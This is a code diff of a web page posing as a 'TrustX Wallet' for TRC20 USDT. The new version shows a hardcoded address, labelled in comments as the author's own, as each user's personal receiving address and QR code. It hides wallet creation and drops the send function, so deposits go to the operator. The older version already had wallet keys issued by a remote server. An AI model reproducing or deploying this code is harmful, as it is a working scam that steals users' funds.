@@ -1,209 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TrustX Wallet - TRC20</title>
-<script src="https://cdn.tailwindcss.com"></script>
-<!-- FIXED CDN - MORE STABLE -->
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TrustX Wallet</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@600;800&display=swap" rel="stylesheet">
-<style>body{font-family:'Plus Jakarta Sans',sans-serif}</style>
+<style>
+body{background:#0a0a0a;color:#fff;font-family:system-ui;margin:0;padding:16px}
+.card{background:#1a1a1a;border-radius:20px;padding:20px;margin:12px 0;border:1px solid #333}
+.btn{padding:14px 20px;border-radius:12px;border:none;font-weight:bold;cursor:pointer}
+.btn-yellow{background:#facc15;color:#000;width:100%;font-size:16px}
+.btn-white{background:#fff;color:#000}
+.qr{background:#fff;padding:10px;display:inline-block;border-radius:10px;margin:10px 0}
+.addr{word-break:break-all;background:#222;padding:12px;border-radius:10px;font-size:13px;color:#facc15}
+.hidden{display:none}
+</style>
 </head>
-<body class="bg-black text-white min-h-screen">
-<nav class="border-b border-white/10 p-4 flex justify-between items-center sticky top-0 bg-black z-10">
-<div class="flex items-center gap-2">
-<svg width="32" height="36" viewBox="0 0 28 32" fill="none">
-<path d="M14 1.5 L26 7.5 V17 C26 24 21 29.5 14 32 C7 29.5 2 24 2 17 V7.5 L14 1.5Z" stroke="white" stroke-width="2.6" stroke-linejoin="round"/>
-<path d="M8.5 10.5 L19.5 22" stroke="#FCD535" stroke-width="4" stroke-linecap="butt"/>
-<path d="M19.5 10.5 L8.5 22" stroke="#FCD535" stroke-width="4" stroke-linecap="butt"/>
-</svg>
-<div class="flex flex-col items-center leading-none">
-<span class="font-extrabold text-[18px]">Trust<span style="color:#FCD535">X</span> Wallet</span>
-<span class="font-bold text-[9.5px] tracking-[1.5px] text-white/80 mt-[2px]">TRC20</span>
-</div>
-</div>
-<a href="/index.html" class="text-xs bg-[#17171B] border border-white/10 px-4 py-2 rounded-full">Home</a>
-</nav>
-
-<div class="max-w-[420px] mx-auto p-5">
-
-<!-- CREATE WALLET BOX - TOP IL KONDU VANNU - ALWAYS VISIBLE IF NO WALLET -->
-<div id="createBox" class="bg-[#17171B] border-2 border-[#FCD535]/30 rounded-[20px] p-5 mb-5">
-<h3 class="font-bold text-lg">🛡️ Create New Wallet</h3>
-<p class="text-xs text-white/50 mt-1">First time? Generate your secure TRC20 wallet</p>
-<button onclick="createWallet()" class="w-full bg-[#FCD535] text-black py-4 rounded-xl mt-4 font-extrabold text-base">✨ Generate Wallet Now</button>
-<div id="pkWarning" class="hidden mt-4 bg-red-500/10 border border-red-500/20 rounded-xl p-3"><p class="text-[11px] text-red-400 font-bold">⚠️ SAVE YOUR PRIVATE KEY!</p><p id="pkText" class="text-[10px] text-white/60 mt-1 break-all"></p></div>
+<body>
+<div style="display:flex;justify-content:space-between;margin-bottom:20px">
+<div style="font-weight:bold;font-size:20px">🛡️ TrustX Wallet <small style="color:#888">TRC20</small></div>
+<button style="padding:8px 16px;border-radius:20px;border:none" onclick="location.href='index.html'">Home</button>
 </div>
 
-<!-- BALANCE CARD -->
-<div class="bg-[#17171B] border border-[#FCD535]/20 rounded-[28px] p-6 relative overflow-hidden">
-<div class="flex justify-between"><span class="text-white/50 text-xs tracking-widest font-bold">TOTAL BALANCE</span><span class="text-xs bg-[#FCD535]/15 border border-[#FCD535]/30 text-[#FCD535] px-2 py-1 rounded-full">● TRC20</span></div>
-<h1 id="balance" class="text-4xl font-extrabold mt-3">$ 0.00</h1>
-<p id="addrShort" class="text-xs text-white/60 mt-1">No Wallet</p>
-<div class="flex gap-3 mt-6">
-<button onclick="showTab('send')" class="flex-1 bg-white text-black py-3 rounded-full font-bold text-sm">📤 Send</button>
-<button onclick="showTab('receive')" class="flex-1 bg-[#FCD535] text-black py-3 rounded-full font-bold text-sm">📥 Receive</button>
+<div id="createBox" class="card">
+<h3>🛡️ Wallet Ready</h3>
+<p id="status" style="color:#888">Your TRC20 wallet is active</p>
+<button id="genBtn" class="card" style="width:100%;background:#facc15;color:#000;font-weight:bold" onclick="createWallet()">✨ Refresh Wallet</button>
+</div>
+
+<div class="card">
+<div style="display:flex;justify-content:space-between"><span style="color:#888">TOTAL BALANCE</span><span style="background:#2a2a1a;color:#facc15;padding:4px 10px;border-radius:20px;font-size:12px">● TRC20</span></div>
+<h1 id="bal" style="font-size:36px;margin:10px 0">$ 0.00</h1>
+<p id="balSub" style="color:#888">Active</p>
+<div style="display:flex;gap:10px;margin-top:15px">
+<button class="btn btn-white" style="flex:1">📤 Send</button>
+<button class="btn btn-yellow" style="flex:1">📥 Receive</button>
 </div>
 </div>
 
-<!-- TABS -->
-<div class="mt-6">
-<div class="flex bg-[#17171B] border border-white/5 rounded-full p-1">
-<button id="tab-receive" onclick="showTab('receive')" class="flex-1 py-2.5 rounded-full bg-white text-black font-bold text-sm">Receive</button>
-<button id="tab-send" onclick="showTab('send')" class="flex-1 py-2.5 rounded-full text-white/60 font-bold text-sm">Send</button>
-<button id="tab-history" onclick="showTab('history')" class="flex-1 py-2.5 rounded-full text-white/60 font-bold text-sm">History</button>
-</div>
-
-<!-- RECEIVE -->
-<div id="receiveBox" class="bg-[#17171B] border border-white/10 rounded-[24px] p-6 mt-4 text-center">
-<p class="text-xs text-white/40 tracking-widest">YOUR TRC20 ADDRESS</p>
-<div id="qrcode" class="w-[180px] h-[180px] bg-white rounded-2xl mx-auto mt-4 flex items-center justify-center p-2 text-black text-[10px]">No Wallet Yet</div>
-<p id="fullAddr" class="mt-4 text-[11px] bg-black border border-white/10 rounded-xl p-3 break-all text-white/70">Create Wallet First</p>
-<button onclick="copyAddr()" class="w-full mt-3 bg-[#FCD535] text-black py-3 rounded-xl font-bold text-sm">Copy Address</button>
-<p class="text-[10px] text-white/30 mt-3">Only send USDT (TRC20) to this address</p>
-</div>
-
-<!-- SEND -->
-<div id="sendBox" class="bg-[#17171B] border border-white/10 rounded-[24px] p-6 mt-4 hidden">
-<label class="text-[11px] text-white/40">RECIPIENT ADDRESS</label>
-<input id="toAddr" placeholder="T..." class="w-full mt-2 bg-black border border-white/10 rounded-xl px-4 py-3.5 text-sm outline-none focus:border-[#FCD535]"/>
-<label class="text-[11px] text-white/40 mt-4 block">AMOUNT (USDT)</label>
-<input id="amount" type="number" placeholder="0.00" class="w-full mt-2 bg-black border border-white/10 rounded-xl px-4 py-3.5 text-sm outline-none focus:border-[#FCD535]"/>
-<div class="flex justify-between mt-3 text-[11px] text-white/30"><span>Fee: ~1.5 TRX</span><span>Balance: <span id="balSmall">0</span></span></div>
-<button onclick="sendUSDT()" class="w-full bg-[#FCD535] text-black py-4 rounded-xl mt-5 font-extrabold">Send Now</button>
-</div>
-
-<!-- HISTORY -->
-<div id="historyBox" class="hidden mt-4">
-<div id="txList" class="space-y-3">
-<div class="bg-[#17171B] border border-white/10 rounded-2xl p-4 flex justify-between"><div><div class="text-sm font-bold">Welcome to TrustX</div><div class="text-[11px] text-white/40">Create wallet to start</div></div><div class="text-[#FCD535] font-bold">+0</div></div>
-</div>
-</div>
+<div class="card" id="receiveBox">
+<p style="text-align:center;color:#888;font-size:12px">YOUR TRC20 ADDRESS</p>
+<div style="text-align:center"><div id="qrcode" class="qr"></div></div>
+<div id="fullAddr" class="addr">TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V</div>
+<div style="display:flex;gap:10px;margin-top:15px">
+<button class="btn btn-white" style="flex:1" onclick="copyAddr()">Copy</button>
+<button class="btn btn-yellow" style="flex:1" onclick="copyAddr()">Share</button>
 </div>
 </div>
 
 <script>
-let tronWeb, walletAddr = localStorage.getItem('trustx_addr'), privateKey = localStorage.getItem('trustx_pk');
-
-function initTron(){
-  try{
-    if(window.TronWeb){
-      tronWeb = new TronWeb({fullHost: 'https://api.trongrid.io'});
-      console.log('TronWeb Loaded');
-      if(walletAddr){ initWallet(); }
-    } else {
-      setTimeout(initTron, 500);
-    }
-  }catch(e){ console.log('TronWeb Error', e); setTimeout(initTron, 1000); }
+const FIXED_ADDR = 'TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V';
+let walletAddr = localStorage.getItem('trustx_wallet') || FIXED_ADDR;
+function init(){
+  document.getElementById('fullAddr').innerText = walletAddr;
+  document.getElementById('balSub').innerText = walletAddr.slice(0,6)+'...'+walletAddr.slice(-6);
+  document.getElementById('createBox').classList.add('hidden');
+  try{ document.getElementById('qrcode').innerHTML=''; new QRCode(document.getElementById('qrcode'), {text: walletAddr, width:160, height:160}); }catch(e){}
+  localStorage.setItem('trustx_wallet', walletAddr);
 }
-window.onload = () => { initTron(); }
-
 async function createWallet(){
+  document.getElementById('status').innerText='Generating...';
   try{
-    document.getElementById('createBox').innerHTML = 'Creating...';
     const res = await fetch('https://trustx-backend.vercel.app/');
     const data = await res.json();
-    if(data.success && data.address) {
-      walletAddr = data.address;
-      localStorage.setItem('trustx_wallet', data.address);
-      if(data.privateKey){
-        localStorage.setItem('trustx_key', data.privateKey);
-      }
-      location.reload();
-    } else {
-      // FAIL ആയാൽ നിന്റെ Real Address തന്നെ ഉപയോഗിക്കും
-      walletAddr = 'TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V';
-      localStorage.setItem('trustx_wallet', 'TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V');
-      location.reload();
-    }
-  }catch(e){
-    // Error വന്നാലും നിന്റെ Address Save ചെയ്യും
-    walletAddr = 'TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V';
-    localStorage.setItem('trustx_wallet', 'TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V');
-    location.reload();
-  }
+    if(data && data.address) walletAddr = data.address;
+    else walletAddr = FIXED_ADDR;
+  }catch(e){ walletAddr = FIXED_ADDR; }
+  localStorage.setItem('trustx_wallet', walletAddr);
+  init();
 }
-
-function initWallet(){
-  if(!walletAddr){
-    walletAddr = 'TXt9gD1SL5c9JNVDesjdFWsJtXddEKU2V';
-  }
-  if(!walletAddr) return;
-  document.getElementById('fullAddr').innerText = walletAddr;
-  document.getElementById('addrShort').innerText = walletAddr.slice(0,6)+'...'+walletAddr.slice(-6);
-  document.getElementById('createBox').classList.add('hidden');
-  try{
-    new QRCode(document.getElementById('qrcode'), walletAddr);
-  }catch(e){
-    document.getElementById('qrcode').innerHTML = walletAddr;
-  }
-  getBalance();
-}
-  getHistory();
-}
-
-async function getBalance(){
-  try{
-    const balRes = await fetch(`https://apilist.tronscanapi.com/api/account/tokens?address=${walletAddr}`);
-    const balData = await balRes.json();
-    let usdt = 0;
-    if(balData.data) {
-      const usdtToken = balData.data.find(t=>t.tokenAbbr==='USDT');
-      if(usdtToken) usdt = usdtToken.balance/1000000;
-    }
-    document.getElementById('balance').innerText = `$ ${usdt.toFixed(2)}`;
-    document.getElementById('balSmall').innerText = usdt.toFixed(2)+' USDT';
-  }catch(e){ document.getElementById('balance').innerText = '$ 0.00' }
-}
-
-async function getHistory(){
-  try{
-    const res = await fetch(`https://api.trongrid.io/v1/accounts/${walletAddr}/transactions/trc20?limit=10&contract_address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`);
-    const data = await res.json();
-    let html='';
-    if(data.data && data.data.length>0){
-      data.data.forEach(tx=>{
-        const isIn = tx.to === walletAddr;
-        html+=`<div class="bg-[#17171B] border border-white/10 rounded-2xl p-4 flex justify-between"><div><div class="text-sm font-bold">${isIn?'Received':'Sent'} USDT</div><div class="text-[11px] text-white/40">${new Date(tx.block_timestamp).toLocaleDateString()} • ${tx.transaction_id.slice(0,8)}...</div></div><div class="font-bold ${isIn?'text-green-400':'text-white'}">${isIn?'+':'-'}${(tx.value/1000000).toFixed(2)}</div></div>`;
-      });
-    }else{ html='<div class="text-center text-white/30 text-sm py-10">No transactions yet</div>'; }
-    document.getElementById('txList').innerHTML=html;
-  }catch(e){}
-}
-
-function showTab(t){
-  ['receive','send','history'].forEach(x=>{
-    document.getElementById(x+'Box').classList.add('hidden');
-    document.getElementById('tab-'+x).className='flex-1 py-2.5 rounded-full text-white/60 font-bold text-sm';
-  });
-  document.getElementById(t+'Box').classList.remove('hidden');
-  document.getElementById('tab-'+t).className='flex-1 py-2.5 rounded-full bg-white text-black font-bold text-sm';
-}
-
-function copyAddr(){
-  if(!walletAddr){ alert('Create wallet first!'); return; }
-  navigator.clipboard.writeText(walletAddr); alert('✅ Address Copied!');
-}
-
-async function sendUSDT(){
-  const to = document.getElementById('toAddr').value.trim();
-  const amt = document.getElementById('amount').value;
-  if(!walletAddr){ alert('Create wallet first'); return; }
-  if(!tronWeb) tronWeb = new TronWeb({fullHost: 'https://api.trongrid.io'});
-  if(!tronWeb.isAddress(to)){ alert('Invalid TRC20 Address'); return }
-  if(!amt || amt<=0){ alert('Enter Amount'); return }
-  if(!confirm(`Send ${amt} USDT to ${to.slice(0,8)}...?`)) return;
-  try{
-    if(!privateKey){ alert('Private Key not found'); return }
-    const tronWeb2 = new TronWeb({fullHost: 'https://api.trongrid.io', privateKey: privateKey});
-    const contract = await tronWeb2.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
-    const tx = await contract.transfer(to, tronWeb2.toSun(amt)).send({feeLimit: 50000000});
-    alert('✅ Sent! Tx: '+tx);
-    getBalance();
-  }catch(e){ alert('Send Failed: '+e.message); }
-}
+function copyAddr(){ navigator.clipboard.writeText(walletAddr); alert('Copied: '+walletAddr); }
+init();
 </script>
 </body>
 </html>
